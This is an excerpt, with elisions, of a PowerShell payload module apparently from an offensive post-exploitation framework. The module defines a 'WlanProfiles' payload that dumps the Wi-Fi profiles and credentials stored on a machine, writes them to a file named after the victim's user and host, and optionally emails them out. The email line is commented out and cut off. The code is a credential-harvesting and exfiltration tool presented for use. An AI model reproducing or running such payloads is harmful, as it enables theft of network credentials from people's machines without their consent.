...
Function Main {
	$PayloadInfo = New-Object PSObject -Property @{
		Name = 'WlanProfiles'
		Author = '@H3LL0WORLD'
		Description = 'Dump the wlan profiles/credentials stored in the machine'
		Link = 'https://github.com/H3LL0WORLD/Powershell/blob/master/Utilities/Get-WlanProfiles.psm1'
		'System Required' = 'False' # The payload can be runned on the SYSTEM user context or shouldn't to 
	}
	$ShowInfo = {
	...
	$Options = @{
		...
		'Language' = New-Object PSObject -Property @{
			'Name' = "Language"
		...
		'OutputFile' = New-Object PSObject -Property @{
			...
			'Required' = "True"
			'Value' = '$PWD\WlanProfiles-$([Environment]::UserName)@$([Environment]::MachineName).txt'
		}
		...
		'EmailSubject' = New-Object PSObject -Property @{
			...
			'Required' = "False"
			'Value' = 'WlanProfiles-$([Environment]::UserName)@$([Environment]::MachineName)'
		}
	}
...
Function Add-Payload {
	...
	# e.g:
	$ModuleSource = Get-Content "$PWD\data\payload_source\Exfiltration\Get-WlanProfiles.psm1" | Out-String
	
	$Command = '$WlanProfiles = Get-WLAN_Profiles ' + $Options.Language.Value + ' | Format-Table | Out-String;'
	$Command += '[IO.File]::AppendAllText("' + $Options.OutputFile.Value + '", $WlanProfiles);'
	...
	if ($Options.EmailReport.Value -or $Options.EmailReport.Value -eq "true")
	{
		if ($Global:Settings.Email.User -ne "" -and $Global:Settings.Email.Password -ne "")
		{
			...
			#$Command += [String]::Format('Send-Mail -From ''{0}'' -Password ''{1}'' -Key {2} -To ''{3}'' -Subject "{4}" -Body $WlanProfiles;', $From, $Password, $Key, $To, $Subject)
